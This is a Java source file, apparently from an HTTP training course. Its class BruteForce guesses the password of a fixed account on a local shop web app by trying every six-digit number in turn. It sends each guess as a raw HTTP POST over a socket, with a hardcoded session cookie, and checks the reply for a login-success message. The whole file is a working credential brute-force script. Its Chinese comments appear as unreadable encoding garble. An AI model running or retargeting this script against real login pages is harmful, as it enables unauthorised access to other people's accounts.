/**
 * �����ƽ��˺�����:
 *��֪�˺ţ�����Ϊ6λ��������
 */
package com.woniuxy.web.httplearn;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class BruteForce {
	public static void main(String[] args) {
		String password = "000000";
		boolean isLogin = false;
		while(!isLogin) {
			System.out.println(password);
			isLogin=tryLogin(password);
			if(Integer.valueOf(password)<9) {
				password ="00000"+(Integer.valueOf(password)+1);
			}else if(Integer.valueOf(password)<99) {
				password ="0000"+(Integer.valueOf(password)+1);
			}else if(Integer.valueOf(password)<999) {
				password ="000"+(Integer.valueOf(password)+1);
			}else if(Integer.valueOf(password)<9999) {
				password ="00"+(Integer.valueOf(password)+1);
			}else if(Integer.valueOf(password)<99999) {
				password ="0"+(Integer.valueOf(password)+1);
			}else if(Integer.valueOf(password)<999999) {
				password =""+(Integer.valueOf(password)+1);
			}else {
				System.out.println("�˺Ŵ��˰�");
			}
			
		}
	}

	public static boolean tryLogin(String password) {
		boolean isPassRight = false;
		// ȷ��������IP�Ͷ˿ں�
		String ip = "localhost";
		int port = 8080;
		Socket browser = null;
		InputStream is = null;
		OutputStream os = null;
		try {
			// �����ͻ����׽���
			browser = new Socket(ip, port);
//			browser.setSoTimeout(1);
			// ׼��HTTP��������(�ǵ�ÿ�ж�Ҫ���У���\r\n����Ӵ)
			StringBuilder request = new StringBuilder();
			// ������
			request.append("POST http://localhost:8080/WoniuShop1.0.0/useroper HTTP/1.1\r\n");
			// ����
			request.append("Host: localhost:8080\r\n");
			// �������ݳ���
			request.append("Content-Length: 42\r\n");
			// ������������
			request.append("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n");
			// cookie
			request.append("Cookie: JSESSIONID=A50DDCB794CFFB2D054755D28F2147EE\r\n");
			// ͷ�����ķָ��Ŀհ���
			request.append("\r\n");
			// ��������
			request.append("oper=login&account=18990341730&pass=" + password + "\r\n");
			// ���������ݷ���������
			// �������������ȡָ����������������
			os = browser.getOutputStream();
			// �����������
			// StringBuilder û��getBytesӴ����Ҫ��תΪString��������
			os.write(request.toString().getBytes());
			// ��ע������Ҫ�����������ˣ���Ϊ�������и�����

			// ��ȡ����������Ӧ���ݣ���ȡָ��ͻ��˵���������
			is = browser.getInputStream();
			// ͨ����������ȡ����
			int len = -1;
			byte[] response = new byte[1024];
			while ((len = is.read(response)) != -1) {
				System.out.println(new String(response, 0, len, "utf-8"));
				String check =new String(response, 0, len, "utf-8") ;
				if("\"��¼�ɹ���\"".equals(check)) {
					isPassRight = true;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {// �ر�����socket
			try {
				if (is != null)
					is.close();
			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				try {
					if (os != null)
						os.close();
				} catch (IOException e) {
					e.printStackTrace();
				} finally {
					try {
						if (browser != null)
							browser.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		}
		return isPassRight;
	}
}
